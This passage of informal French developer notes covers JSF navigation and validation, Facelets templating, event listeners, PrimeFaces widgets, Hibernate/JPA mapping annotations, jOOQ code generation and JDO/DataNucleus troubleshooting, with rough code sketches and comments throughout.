                                                                        <view-param> Optionnel mais dans le cas d'un post, pour refaire un get (Pour respecter PRG) on met ici tous les  champs à repopuler (car ils sont perdus à cause du redirect) mais au moins l'URL peut etre bookmarquee
                                                                          <name>nomDuParamDeLUrl</name>
                                                                          <value>#{monBean.ParmEquivalent} ou string quelconque</value> AFAIRE: à tester
                                                                                    equivalent à <f:metadata> mais je n'utilise pas ca je prefere tout mettre dans face-config.xml
                                                                                                    <f:viewParam name="monParam" value="#{monBean.ParmEquivalent}"/>
                                                                                                    <f:viewParam name="monParamDate2" value="#{monBean.ParmEquivalentDate2}">
                                                                                                      <f:convertDateTime pattern="MM-dd-yy"/>
                                                                                                    </f:viewParam>
                                                                                                 </f:metadata>
                                                                        </view-param>                                                                                
                                                                    </redirect>
                                                              </navigation-case>
                                                              <navigation-case>
                                                                    <from-action>#{MonManagedBean.maMethode}</from-action> // optionnel: si on le met pas c parce que une xhtml appelle une xhtml directement
                                                                    <from-outcome>return-value-2</from-outcome>
                                                                    <to-view-id>/result-page-2.xhtml</to-view-id>
                                                              </navigation-case>
                                                            ...
                                                          </navigation-rule>
                                                          <navigation-rule>
                                                            ...
                                                          </faces-config>
                            sinon
                            si forward = nom de page sans le xml -> utilise et va vers forward.xhtml
                            sinon reste sur la meme page
        validation au niveau des beans java (!=validation jsf) :
        pour passer des validations jsf ci-dessus à directement ca : 
              <h:inputText label="sdlfkj" id="toto" value="#{monBean.maPropriete}"
              donc:
              @ManagedBean(name="monBean")
              public class MonBean...
              {
                @NotEmpty (message="blablabla"(non i18n) ou message="{mon.libelle.i18n"} (i18n)) //offert
                @MonValidateurBean // customise, voir ci-dessous
                public String maPropriete;
              ...
              }
              ailleurs
              @Constraint (validatedBy=ClasseContenantLeCodeDeMonValidateurBean.class)
              @Target ({ElementType.METHOD, ElementType.FIELD})
              @Retention(RetentionPolicy.RUNTIME)
              public @interface MonValidateurBean
              {
                String message() default="{mon.message.i18n}";
                Class<?>[] groups() default{};
                Class<? extends ConstraitPayload>[] payload() default{};
              }
              ailleurs
              public class ClasseContenantLeCodeDeMonValidateurBean implements ConstraintValidator<MonValidateurBean,String // du type de maPropriete>
              {
                public void initialize (MonValidateurBean parameters)
                {
                  // est toujours execute en 1er premier
                }
                public boolean isValid(String value, ConstraintValueContext?? context)
                {
                  ... ma logique...
                  return true ou false;
                }
              }                                     
Faire des templates (tiles reutilises) en jsf:
    couverture: lnf-template.xhtml 
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml" xmlns:ui="http://java.sun.com/jsf/facelets">
    <head>
      <meta http-equiv="Content-Type" content="text/html; charset=windows-1352" />
      <title><ui:insert name="title">Placeholder Title</ui:insert></title>
      <link href="css/vt.css" rel="stylesheet" media="screen" /> // super important de toujours mettre rel="stylesheet" media="screen" 
    </head>
    <body>
      ...
      <ui:insert name="body">Placeholder Body</ui:insert>
      ...
    </body>
    </html>
    page  appellee: (elle meme pouvant etre une couverture)
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
        <html xmlns="http://www.w3.org/1999/xhtml" xmlns:ui="http://java.sun.com/jsf/facelets" xmlns:h="http://java.sun.com/jsf/html" xmlns:f="http://java.sun.com/jsf/core">
          <body>
          <ui:composition template="/lnf-template.xhtml">
            <ui:define name="title">
              blabla
             </ui:define>
             ... code ici sera ignore...
            <ui:define name="body">
              ...blabla...
            </ui:define>
          </ui:composition>
          </body>
        </html>
faire des includes en jsf:complementaire de ci-dessus P utiliser aussi.
            ici on envoit parametre 
                      <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
                      "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html
                      xmlns="http://www.w3.org/1999/xhtml"
                             xmlns:ui="http://java.sun.com/jsf/facelets"
                             xmlns:h="http://java.sun.com/jsf/html">
                      <!-- This is the main page for the application -->
                      <ui:include src="menubar.xml">
                        <ui:param name="user" value="#{currentUser}"/>
                       </ui:include>
                  page menubar.xml :
                  <html xmlns="http://www.w3.org/1999/xhtml" xmlns:ui="http://java.sun.com/jsf/facelets" xmlns:h="http://java.sun.com/jsf/html" xmlns:f="http://java.sun.com/jsf/core">
                  Welcome, #{user.honorific} #{user.firstName}
                  #{user.lastName}!
                  ....
            ici on envoie pas de param: 
                  <ui:decorate template="requiredTemplate.xhtml">
Pas bien compris: sert à forcer la definition d'UIComponents je crois...
      <ui:component id="optionalComponentId" binding="optionalValueExpression">
      <ui:fragment id="optionalComponentId" binding="optionalValueExpression">
      <ui:remove>
Equivalent java des composants : voir photo telephone. Les UIComponents ont des renderers differents en fonction des devices qui les affichent      
Pour debuger ma view: 
    <ui:debug hotkey="optionalHotKey" /> // si hotkey n'est pas def alors faire Ctrl+Shift+D
    besoin mettre dans web.xml:
          <context-param>
      		<param-name>javax.faces.FACELETS_DEVELOPMENT</param-name>
      		<param-value>true</param-value> est donc recuperable uniquement par System.getProperty(javax...etc etc) // prop de la jvm voir LINKù*ù
      	</context-param>
voir pour en cas d'erreur rediriger vers une page dediee (si exception) dans web.xml dans cette doc
      dans web.xml:
          <error-page>
            <exception-type>javax.faces.application.ViewExpiredException
            </exception-type>
            <location>/faces/sessionExpired.xhtml</location>
            ... Mais si on ne met pas ca, pas grave car par defaut page d'erreur est top 
Afficher une java.util.list<String>
        <h:dataTable value="#{userBean.sportsInterests}" var="row" >
          <h:column>
            <h:outputText value="#{row}"/>
          </h:column>
        </h:dataTable>
        autre exemple après une selection : 
            <h:dataTable border="1" var="maLigne" value="#{monBean.donnees[flash.maSelectionMiseEnMemoireFlash]}"> // on imagine que je viens de valider un form ou je set le flash.maSele... pour afficher un tableau de donnees
              <h:column>
                  <f:facet name="header">First Name</f:facet>
                  #{maLigne.firstName}
              </h:column>
              <h:column>
                  <f:facet name="header">Last Name</f:facet>
                  #{maLigne.lastName}
              </h:column>
              <h:column>
                  <f:facet name="header">Sex</f:facet>
                  <h:outputText value="#{maLigne.sex}">
                      <f:event type="preRenderComponent" listener="#{unModel.uneMethodeQuiPeutRedefinirLeRequest}"/> (c'est un ComponentSytemEventListener) // dans ma uneMethodeQuiPeutRedefinirLeRequest je peux très bien modifier le request et quand la page a fini de s'afficher mon request peut etre pris en compte avec #{monParametre} 
                  </h:outputText>                                      public void uneMethodeQuiPeutRedefinirLeRequest(ComponentSystemEvent cse) throws AbortProcessingException 
              </h:column>                                              { ValueHolder monchamp= (ValueHolder)cse.getComponent(); ....}
          </h:dataTable>
        pour attacher un listener (ex: scroll pagination) a la datatable ou à une autre UI (utile si veut faire de l'ajax-like avec onclick et immediate):
          <h:dataTable id="enpTable" rows="10" var="row" binding="#{monBean.typeDonnees}"-------------->Java: public UIData getTypeDonnees(){...return un UIData}
                                                         value="#{monBean.donneesInitiales}">-------------->Java: public List getDonneesInitiales(){...}
              ....
          </h:dataTable>
          <h:scroller for="enpTable" actionListener="#{monBeanOuBackingBean.methodeDeMonBean}"/>-------------->Java: public void methodeDeMonBeanEtCetteMethodeEstMonActionListener(ActionEvent event){...}
          <h:selectOneMenu valueChangeListener="#{monBean.methodeDeMonBeanQuiEstUnListener}" value="#{monBean.proprieteDeMonBean}">
          <h:commandButton value="click!" onclick="this.form.submit();" immediate="true">
              <f:actionListener type="mon.package.MaClasseActionListener"/> 
          </h:commandButton>
                    // côte java:public class MaClasseActionListener
                                  {
                                    public void processAction(ActionEvent ae)
                                    {...}
                                  }
          <h:inputText value="blah" onchange="this.form.submit(this);" immediate="true">
                        <f:valueChangeListener type="mon.package.MaClasseValueChangeActionListener"/> 
          </h:inputText>
                    // côte java:public class MaClasseValueChangeListener implements ValueChangeListener 
                                   {                                                                 
                                      public MaClasseValueChangeListener(){}                              
                                      public void processValueChange(ValueChangeEvent vce)           
                                      {
                                        ...
                                      }
                                   }
         faire du javascript avec jsf : he oui ce n'est plus aussi simple qu'avant: exemple: quand on clique sur la checkbox je veux que ca fasse apparaitre un champ texte et son libelle
              <h:selectBooleanCheckbox 
                            binding="#{zipAutoFill.moreInfoCheckbox}" 
                            immediate=true onclick="document.getElementById('autofill').click();"
                            valueChangeListener="#{zipAutoFill.toggleMoreInfo}">
                          </h:selectBooleanCheckbox>
              <h:outputLabel value="More Info" rendered="#{zipAutoFill.infoRendered}"/>
              <h:inputTextarea id="moreinfo" binding="#{zipAutoFill.moreInfo}" rendered="#{zipAutoFill.infoRendered}"/>
              cote java:
                public void toggleMoreInfo(ValueChangeEvent vce)
                {
                  setInfoRendered((Boolean)vce.getNewValue());
                )         
                                                                       
                                                          
Les events et listeners:                                                    
    evt    evt    evt   evt   "que se passe t'il?"                          
     |  \     |    / \    |                                                 
     |    --\  \ /    \   |                                                                     
    Listr    Listr    Listr   "que faire alors?"
    
    les phasesListener : sont des classes java implementant PhaseListener:**¤**
        public class MyPhaseListener implements PhaseListener
        {
          public MyPhaseListener(){}
          public void beforePhase ou afterPhase ou getPhaseId(PhaseEvent ev)
          {
            if (ev.getPhseId()==PhaseId.RESTORE_VIEW ou APPLY_REQUEST_VALUES ou PROCESS_VALIDATIONS ou UPDATE_MODEL_VALUES ou INVOKE_APPLICATION ou RENDER_RESPONSE)
            {
                // ici je rajoute à la volee un converter à mon component
                monComponentValueHolder = (ValueHolder)FaceContext.getCurrentInstance().getViewRoot().findComponent("..." exemple "form"+NamingContainer.SEPARATOR_CHAR+"intComponent") caste en ValueHolder: 
                Converter monConverter=FaceContext.getCurrentInstance().getApplication().createConverter("type(javax.faces.Integer) ou classe (Float.class")
                monComponentValueHolder.setConverter(monConverter);
                (mais du coup on quitte le MVC voir page 7-14)
                
                // ici je rajoute à la volee un ou plusieurs validator à mon component
                // dabord je declare ma methode validator
                      MethodBinding mb = FaceContext.getCurrentInstance().getApplication().createMethodBinding("#{userBean.validateEmail}",null); // ou si arguments dans la methode : , new Class[]{FacesContext.class, UIComponent.class, Object.class});}
                // ou bien ma classe validator
                      Validator monValidator=FaceContext.getCurrentInstance().getApplication().createValidator("MonValidator");
                // je recupere le component a qui je veux rajouter un ou plusieurs validator
                monComponentEditableValueHolder = (EditableValueHolder)FaceContext.getCurrentInstance().getViewRoot().findComponent("..." exemple "form"+NamingContainer.SEPARATOR_CHAR+"intComponent") caste en EditableValueHolder:
                // puis je rajoute le ou les validators
                monComponentEditableValueHolder.setValidator(mb);
                ou
                monComponentEditableValueHolder.getValidators(); // ici il faut s'assurer qu'il n'a pas dejà les validators qu'on veut rajouter en double.(if (validators[i] instanceof MonValidator)) Si c'est le cas faire return; linkinstanceof
                monComponentEditableValueHolder.addValidator(monValidator);
            }
          }
        }
      Les SystemEventListener: permet d'executer du code au demarrage et à l'arret de l'application (par exemple initialiser des variables applicatives) systeme de cache
            public class MonApplicationListener implements SystemEventListener
            {
              public boolean isListenerForSource(Object app)
              {
                return app instanceof Application; // filtre en fonction du type d'event pour executer la methode suivante que lors d'events applicatifs linkinstanceof
              }
              public void processEvent(SystemEvent event) throws AbortProcessingException
              {
                if (event instanceof PostConstructApplicationEvent)
                {
                    setter des variables applicatives par ex
                    ou variable de session: FacesContext.getCurrentInstance().getExternalContext().getSessionMapMap(); ....put, get...
                }                
                  if (event instanceof PreDestroyApplicationEvent)
                {
                    supprimer mes variables applicatives par ex
                }
              }
            }    
      Pour initier-declarer les listener:
          utiliser les methodes : UIComponent ou Application.subscribeToEvent(Class<? extends SystemEvent> postConstructEventParExemple, SystemEventListener monListener);
          context.getApplication().publishEvent(context,etc...)

Afficher une java.util.Map<String,String>
        <h:outputText value="#{userBean.sportsInterests}"/>// affiche toute la map                
pour afficher un element d'une liste : 
        <h:outputText value="#{userBean.sportsInterests[0]}"/>// le premier ici
        si c un objet de type Map: <h:outputText value="#{userBean.sportsInterests['Swimming']}"/>
  donnees stochees dans flash: 
        ne sont dispo qu'a la page suivante puis detruites juste après
        pour setter un flash dans mon bean : 
            Flash flash = FacesContext.getCurrentInstance().getExternalContext().getFlash();
            flash.put("monflash","ma valeur"); // sera accessible en jsf par #{flash.monflash}      
primefaces : primeface :
checkboxes : 
    <h:form>  <table>
         <c:forEach items="${ideaBean.columns}" var="col"> // attention ca c du JSTL mieux vaut pas melanger avec JSF donc plutot faire comme ci- dessous
      	<tr><td>		<h:outputText value="#{col.name}" /></td><td>  <p:selectBooleanCheckbox value="#{col.value}" /></td></tr> // col.value doit etre un boolean
      	</c:forEach>
         	</table>
    	</h:form>
      Sans jstl mais que jsf:
      <ui:repeat value="#{licenceBean.allLicencesSelectObj}" var="item">
						  <h:outputText value="#{item.id}" /> .. etc pour la checkbox
						</ui:repeat>

liste de donnees : 
    <p:dataList value="#{ideaBean.ideas}" var="idea" itemType="disc">
    				 #{idea.title}
    			</p:dataList>*
tableau complexe :
    <p:dataTable var="idea" value="#{ideaBean.ideas}" rowKey="#{idea.id}" paginator="true" rows="10" selection="#{ideaBean.selectedIdea}" selectionMode="single" filteredValue="#{ideaBean.filteredIdeas}" id="ideasTable">  
        <!--  <p:ajax event="rowSelect" update=":form:display" oncomplete="carDialog.show()" /> -->  
          <f:facet name="header">  
  	         List of Ideas  
    	   </f:facet>  
        <p:column headerText="Id" sortBy="#{idea.id}" filterBy="#{idea.id}" id="id">  
            #{idea.id}  
        </p:column>  
  
        <p:column headerText="Descr" sortBy="#{idea.title}" filterBy="#{idea.title}" id="title">  
            #{idea.title}  
        </p:column>  
    </p:dataTable>  

fenetre modale :
				<p:commandButton id="modalDialogButton" value="Modal" onclick="dlg2.show();" type="button"/>			
	         <!-- appendtobody=true --> si la fenetre modale couvre tout! bloque!block
        <p:dialog id="modalDialog" appendToBody="true" header="Modal Dialog" widgetVar="dlg2" modal="true" height="100">  
            <h:outputText value="This is a Modal Dialog." />  
        </p:dialog>  
  
faire des placesholders:  
    <p:inputText id="keyword" value="#{watermarkBean.keyword}" required="true" label="Keyword" />  
        <p:watermark for="keyword" value="Search with a keyword" />   
faire les tiles (layout):
    common.xhtml
    <p:layout fullPage="true">
    	 <p:layoutUnit position="north" size="60">
          ....
      	 	<ui:insert name="top">top</ui:insert>
      	....
    	 </p:layoutUnit>
    	 <p:layoutUnit position="west" size="300">
    		 ....
    		 <ui:insert name="top">top</ui:insert>
    		 ...
    		 </p:layoutUnit>
    </p:layout>
    mapage.xhtml
    <ui:composition template="/templates/common.xhtml"
     xmlns="http://www.w3.org/1999/xhtml"
     xmlns:f="http://java.sun.com/jsf/core"
     xmlns:h="http://java.sun.com/jsf/html"
     xmlns:ui="http://java.sun.com/jsf/facelets"
     xmlns:p="http://primefaces.org/ui"> 

        <ui:define name="top">
              ... // ca ca va s'inclure dans le common.
        </ui:define>
        ...code ici est ignore...
        <ui:define name="gauche">
              ...
        </ui:define>
        ...code ici est ignore...
</ui:composition>
Bouton:
  <p:button value="#{ideaProperties.ListOfMyIdeas}"></p:button>
Bouton submit non ajax:
  <p:commandButton value="Non-Ajax Submit" actionListener="#{loginBean.doLogin}" ajax="false" />
    un bouton qui envoie une requete ajax :                                                        
        <h:inputText value="#{purchases.cheapItems[0]}"/>// ici c'est un tableau ou bien <h:inputText value='#{purchases.valuableItems["low"]}'/>       
        <h:commandButton...action="#{someBean.someMethod // ici pas de get et de set dans le nom de la methode}"/>
          <f:ajax execute="@ form" render="resultId"/> // execute prend l'id d'un objet  du dom qu'on envoie au serveur!!! et de meme pour render: il prend un id du dom
        </h:commandButton>      
        <h:outputText value="#{myBean.myProperty}" id="resultId"/>.
------------FIN BEURK 

                              
  DM 
   ^ 
   | IOC (interfaces)
   V
Hibernate :
si j'ai cette erreur :        Cannot convert value '0000-00-00 00:00:00' from column 5 to TIMESTAMP
        il faut que je modif mes valeurs ='0000-00-00 00:00:00' en date valide 
  definition bean: getter, setter independant (pas d'extension ni d'heritage) serializable
  definition pojo: idemn que bean mais peut etendre, heriter, peut ne pas être serializable
  DAO faire un dao par dm p7 gestion des sessions à ce niveau grâce au Contextual Session
      possibilite synchro schema base-DAO java
      annotations hibernate :p5-6
          Feaching
          caching (parametrer taille et temps d'expiration)
          lazy-loading
              for (Category categ: categories)
              {
                for (Art art : categ.getArt()){system.out.print(art.getTitle());}} // FAIT N requettes! (erreur N+1)
              Pour eviter faire :
               1) List cat = entityManager.createQuery("SELECT cat FROM category cat LEFT JOIN FETCH cat.art WHERE cat.id=:id").getResultList(); //overrite lazy default behaviour at runtime
               2) @ManyToMany
                  @BatchSize(size=10) recup que les 10 premps ou bien @Fetch(FetchMode.JOIN)// recup tout! inverse de lazy
                  public Set<Art> getArt(){return arts;}
              Si LazyInitializationException: c parce qu'il n'existe pas d'EntityManager                
      exceptions generiques hibernates vers spring p7
            pour faire des requetes :
            HQL   possede criteria api
            JPQL (2.0 contient criteria) preferer criteria api
            ActiveRecordPattern (pour pouvoir faire monEntite.save())
      Hibernate peut fonctionner avec framework Lucene qui permet de faire des recherches textuelles imprecises comme google
      Si classes java hierarchisees, meilleur option c'est faire ca : 
            Java                                                                                    DB
          @Entity                                                                                     1 seule table
          @Id                                                                                         c'est le champ de cle primaire
          @GeneratedValue                                                                             id est incremente auto
          @Inheritance(strategy = Inheritance type.SINGLE_TABLE)                                         cols de A
          @DiscriminatorColumn(discriminatorType=DiscriminatorType.STRING ou CHAR ou INTEGER)            cols de B et de C
          @DiscriminatorValue("GENERIC")
                A                                                                                   
               /  \                         
              /      @DiscriminatorValue("CHAISPASCEQUECEST!")
      B extends A     C extends A                        
       @Entity
       @Cache(usage=CacheConcurrencyStrategy.READ_WRITE//existe quasi pas de cache: access concurent bien tolere .NONSTRICT_READ_WRITE si updates rares(bof, pas bien pige) .READ_ONLY(cache jamais invalide: tres performant mais updates pas possibles si cache est outOfdate (sur?))
       @Table(name="NonDeLaTableEnBDSIDifferenteQueNomClasseJava") // optionnel
            public class UserPermission implements DomainObject, Serializable 
            {
            	@Id //Cle primaire
            	@GeneratedValue //(strategy=GenerationType.AUTO par defaut c a d 1 sequence pot tables. Deconseille) ou (strategy=GenerationType.SEQUENCE, generator="NOMDEMASEQ") 1 sequence nommee NOMDEMASEQ pour cette table seulement
            	private Integer id;

              @ManyToOne //1ici a n labas(passur?)
              @Column(name="NonDeLaColonneEnBDSIDifferenteQueNomProprieteJava") // optionnel
              @Cache peut etre aussi mis au niveau d'une propriete
            	   private Idea idea;
            	@OneToMany (orphanRemoval=true//pour les deletes en cascade, cascade={javax.persistence.CascadeType.ALL}//pour les update en cascades)
            	               ,mappedBy="permission") // car je suis dans le classe Permission.class et je fais ref à UserPermission.permission
            	   private Set<User> getUsers(){return users;}
            	@Temporal(TemporalType.TIMESTAMP)
            	   public Date getCommentDate(){return commentDate;}
            	@Version //pour les acces concurents   (voir cache ci-dessus)
            	   public Integer getVersion(){return version;}
              @Transient // en opposition à @Basic qui est mis par defaut
                  public String proprieteNonPersistanteCarOnAMisTransient;                            
                  ManyToMany : 2 possibilites:
                        permission.class:
                          @ManyToMany (mappedBy="nomDeLaProprieteDeLautreEntiteQuiAppelleCetteClasseLà") //mappedBy optionel
                        	@JoinTable(name="UserPermission")  // ma table de jointure. pas besoin de creer la table de cette classe.
                        	private Set<User> users;
                        user.class:
                            @ManyToMany
                    	      @JoinTable(name="UserPermission")
                    	      private Set<Permission> permissions;
                  ManyToMany jointure de trois tables : 
                            ma table de jointure : 
                              @Entity
                            public class UserPermission implements DomainObject, Serializable 
                            {
                            	@Id
                            	private Integer id;
                            	@ManyToOne 
                            	private Idea idea;
            	@ManyToOne
            	private User user;
            	@ManyToOne
            	private Permission permission;
            	@Override
            	public String getId() {
            		return null;
            	}
                            } 
                          	@Override
                          	public String getId() {
                          		return null;
                          	}
                          }    	      
      chacune de mes tables jointes : 
        	@OneToMany(mappedBy="permission") // car je suis dans le classe Permission.class et je fais ref à UserPermission.permission
        	private Set<UserPermission> userPermission;
             Comparer des entitees entre elles si elles sont des listes comme proprietes: il faut overrider equals et hashcode: (voir page 84Spring persistance with Hibernate)
                @Override    (A FAIRE: GENERALISER AVEC LE DESIGN PATTERN DES DAO)
                public boolean equals(Object o)
                {
                  if(this==o) return true;
                  if(!(o instanceof Category)) return false;
                  Category category = (Category));
                  if (categoryName!=null? !categoryName.equals(category.categoryName) : category.categoryName!=null)
                  {return false;
                  }else{return true;}
                }
                @Override
                public int hashCode()
                {return categoryName!=null? categoryName.hashcode() :0;}
                
JPA :
    pour faire du reverse engineering java vers base de donnee java2db
    monProjet>Properties>Ajouter Facelets JPA; 
    Recuperer dans ecolipse Help>Update>Plugin Hibernate tools (http://download.jboss.org/jbosstools/updates/stable/indigo)
    ouvrir console Hibernate et configurer une connection à une base
    Clic droit sur mon projet > JAP > faire le reverseEngeniring

  FORMS ----> envoie des DTO----------equivalent-----------
                           |                               |
                           vers                            |
                    CMD     |                              |
                      update(monDTO)                       |
                      {                                    |
                        converti DTO->BO                   |
                        et appelle DAO                     |
                      }                                    |
  DAO = methodes crud                                      |
      methode(fait appel à ENTITY)------------------(BO=MODEL)ENTITIES connectees à la base
    Enleve expres

Hibernet le livre :
exemple de fichier mapping pojo-base p10
JOOQ : mieus que jdo?
    facile: dans eclipse pour lancer le generateur: 
    class main : org.jooq.util.GenerationTool
    arguments de programme : /jooq.properties
    ce fichier contient : 
    jooq.properties :
           #Configure the database connection here
          jdbc.Driver=com.mysql.jdbc.Driver
          jdbc.URL=jdbc:mysql://localhost:3306/lduverge
          jdbc.Schema=lduverge
          jdbc.User=root
          jdbc.Password=
          
          #The default code generator. You can override this one, to generate your own code style
          #Defaults to org.jooq.util.DefaultGenerator
          generator=org.jooq.util.DefaultGenerator
          
          #The database type. The format here is:
          #generator.database=org.util.[database].[database]Database
          generator.database=org.jooq.util.mysql.MySQLDatabase
          
          #All elements that are generated from your schema (several Java regular expressions, separated by comma)
          generator.database.includes=.*
          
          #All elements that are excluded from your schema (several Java regular expressions, separated by comma). Excludes match before includes
          generator.database.excludes=
          
          #Primary key / foreign key relations should be generated and used. 
          #This will be a prerequisite for various advanced features
          #Defaults to false
          generator.generate.relations=true
          
          #Generate deprecated code for backwards compatibility 
          #Defaults to true
          generator.generate.deprecated=false
          
          #The destination package of your generated classes (within the destination directory)
          generator.target.package=com.application.yoani.server.servlet.jooq
          
          #The destination directory of your generated classes
          generator.target.directory=D:/workspaceGanymedeGXT/YoaniWeb/src/
          
          #Generate a master data table enum classes (several Java regular expressions, separated by comma)
          #generator.generate.master-data-tables=[a list of tables]
          
          #For every master data table, specify two special columns
          #generator.generate.master-data-table-literal.[master data table]=[column used for enum literals]
          #generator.generate.master-data-table-description.[master data table]=[column used for documentation]

DAO : design pattern bonne pratique
un @Repository se base sur les DAO pour faire des find, get etc sur plusieurs tables. Le DAO lui sert aux updates sur une seule table
  Besoin que MonObjet extends BaseEntity.
  IMonObjetDao ----------extends-------->IGenericDao (contient toutes les methodes CRUD basiques) public interface IGenericDao<T extends BaseEntity> { public T getBook(long id);}
    |  extends IGenericDao<Codecast>{       |  
    |                                       |   
    |                                       |
  class MonObjetDao ----------extends-------->class GenericDao (chaque MonObjetDao a son instance) (doit contenir toutes les methodes communes en entier.)
        ||                              public class GenericDao<T extends BaseEntity> implements IGenericDao<T>{...}
  public class MonObjetDao extends GenericDao<MonObjet> implements IMonObjetDao {...}   
  ne contient que les methods specifiques                                        
generiques : generic : pour eviter de caster et d'avoir a utiliser object  
  pour ne pas avoir a tapper les requetes basiques les requetes de base select * from toto etc etc...
        @RepositoryRestResource
        interface MonObjetRepository extends JpaRepository<MonObjet, Long>{
        }
        tout y est!!
JDO :
si j'ai l'erreur 
    error: cannot access Detacheable.... retapper code pour qu'il recompile ca devrait marcher.
pour faire un java2db java vers la base de donnee: 
    soit utiliser maven mais ca ne marche pas tout le temps (???) Attention bien utiliser mvn datanucleus:schema-createschema  et non pas mvn datanucleus:schema-create!!
    ATTEntion si rien n'est cree en base on peut executer datanucleus:schema-validate et là .. ca marche... pfff 
    Soit utiliser le pluggin eclipse DataNucleus de eclipse
faire une relation N-N jointure nn
        SUPPLIERS------PRODUCTS_SUPPLIERS---------PRODUCT
        supplier_id     product_id                product_id
                        supplier_id
                        
      // ATTENTION si il enregistre qu'une seule ligne à chaque fois dans la table des jointures essayer d'inverser les annotations entre les deux classes
        public class Product // important: mettre les getters et setters et les utiliser sinon le passage detached-clean->detached-dirty ne se fait pas si on modif un champ
        {
            @Persistent(table="PRODUCTS_SUPPLIERS")
            @Join(column="PRODUCT_ID")
            @Element(column="SUPPLIER_ID")
            Set<Supplier> suppliers; Attention plutot utiliser ArrayList à Set car ArrayList est serialisable!
        }
        public class Supplier
        {
            @Persistent(mappedBy="suppliers") // nom de l'objet java
            Set<Products> products;  Attention plutot utiliser ArrayList à Set car ArrayList est est serialisable!
        }
Faire une relation 1-N
ELEVE---------------GROUPE (un eleve appartient à un groupe et un groupe appartient à plusieurs eleves)
ideleve             idgroupe
idgroupe
public class Groupe
{
    Set<Eleve> eleves;  Attention plutot utiliser ArrayList à Set car ArrayList est est serialisable!
}

public class Eleve
{
      @Persistent(mappedBy="eleves") // nom de l'objet java
	    public Groupe groupe;
}

Si quand je fais makePersistent j'ai l'erreur : 
                 [java] java.lang.NullPointerException
                   [java] 	at com.renault.wec.client.jdo.WEC72_M_CHMSCE_PK.hashCode(Unknown Source)
                   [java] 	at java.util.HashMap.put(HashMap.java:372)
                   C'est parce que sans doutes j'ai pas sette un id qui est cle primaire dans mon objet
                   
  le seul moyen que j'ai trouve pour copier un objet detached ou persistant en autre objet sans se prendre la tete: 
      WEC52_M_CHAMPS maCopieDObjetJdo = new WEC52_M_CHAMPS();
			Set<String> cles = monObjetJdoACopier.getProperties().keySet();
			Iterator<String> it = cles.iterator();
			while (it.hasNext()){
			   String cle = it.next();
			   Object valeur = monObjetJdoACopier.get(cle);
			   maCopieDObjetJdo.set(cle, valeur);
			}
      
  pour connaitre l'etat d'un objet JDO : 
          logger.debug(JDOHelper.getObjectState(wt[1]).toString()); // transient=independant; persistant= Hollow =en base et raccroche à la base; detatched = independant mais il a un ID donc peut etre retrouve en base
          les differents etats :
                          Transient	Any object created by the developer that do are not persisted. These don't have a JDO identity.
                          Persistent New	Any object that is newly persisted in the current transaction. A JDO identity has been assigned to these objects.
                          Persistent Dirty	Any persistent object that has been changed in the current transaction.
                          Hollow	Any persistent object that represents data in the datastore, but whose values are not in the instance.
                          Persistent Clean	Any persistent object that represents data in the datastore, and whose values have not been changed in the current transaction.
                          Persistent Deleted	Any persistent object that represents data in the datastore, and that has been deleted in the current transaction.
                          Persistent New Deleted	Any object that have been newly made persistent and then deleted in the same current transaction.
                          Persistent Non transactional	Any persistent object that represents data in the datastore, whose values are loaded but not transactionally consistent.
                          Persistent Non transactional Dirty	Any persistent object that represents data in the datastore, whose values are loaded but not transactionally consistent, and that has been modified.
                          Transient Clean	Any transient object that represents a transactional instance whose values have not been changed in the current transaction.
                          Transient Dirty	Any transient object that represents a transactional instance whose values have been changed in the current transaction.
                          Detached Clean	Any detached object that represents a persistent instance whose values have not been changed since detaching.
                          Detached Dirty	Any detached object that represents a persistent instance whose values have been changed since detaching.
   
  si j'ai l'erreur has no table in the database ou bien could not be deserialized
      refaire un enhancement
  si j'ai l'erreur  org.datanucleus.exceptions.NucleusUserException: Attempt to store value yyyy in column xxxxx that has maximum length of 256. Please correct your data!
          il faut mettre ca comme meta-data devant mon champ dans ma classe jdo 
                @Column(jdbcType="VARCHAR", length=200)
                String WEC51_DEBHTML=null;
    fonctionnement :
        j'ai un PersistanceManagerFactory par database de connectee. (en faire un par application)
        BIEN FERMER le persistanceManager quand on a fini la requette et la transaction .close()
       singleton :de persistancemanagerfactory :
                                                      public class PersistanceManagerFactorySingleton 
                                                      {
                                                        private	PersistenceManagerFactory pmf;
                                                        private volatile static PersistanceManagerFactorySingleton uniqueInstance; // volatile signifie que cette variable peut etre utilisée par plusieurs threads mais sa valeur n'est pas stockée dans le cache du thread en cours mais dans une mémoire partagée par tous les threads. L'accès à cette variable est donc implicitement synchronized mais c plus efficace que synchronized car ne bloque pas. volatile peut s'appliquer à des objets et de types primitifs aussi contrairement à synchronized
                                                        private PersistanceManagerFactorySingleton(PersistenceManagerFactory pmffact)
                                                        {
                                                          	pmf = pmffact;
                                                        }
                                                      public static PersistanceManagerFactorySingleton getInstance()
                                                      {
                                                      	if (uniqueInstance ==null)
                                                      	{
                                                      		synchronized (PersistanceManagerFactorySingleton.class) //Le mot-clé synchronized sur ce bloc empêche toute instanciation multiple même par différents "threads". Il est TRES important. il attends ici tant que c locké par un autre thread
                                                      		{
                                                      			if (uniqueInstance==null)
                                                      				{
                                                      					PersistenceManagerFactory persistanceManagerFactory = JDOHelper.getPersistenceManagerFactory("datanucleus.properties");
                                                      					uniqueInstance= new PersistanceManagerFactorySingleton(persistanceManagerFactory);
                                                      				}
                                                      		}
                                                      	}
                                                      	return uniqueInstance;
                                                      }
                                                      public PersistenceManagerFactory getpmf() {
                                                      	return pmf;
                                                      }
                                                      }
                                    ailleurs pour l'apeller : 
                                            PersistenceManager pm = PersistanceManagerFactorySingleton.getInstance().getpmf().getPersistenceManager();
    si j'ai l'erreur java.lang.NoSuchMethodError: org.datanucleus.store.mapped.DatastoreContainerObject.addDatastoreField(Ljava/lang/String;Lorg/datanucleus/store/mapped/DatastoreIdentifier;Lorg/datanucleus/store/mapped/mapping/JavaTypeMapping;Lorg/datanucleus/metadata/ColumnMetaData;)Lorg/datanucleus/store/mapped/DatastoreField;
                     c'est parce que je n'utilise pas les bonnes version de librairies de rdbms, jdo, datanucleus
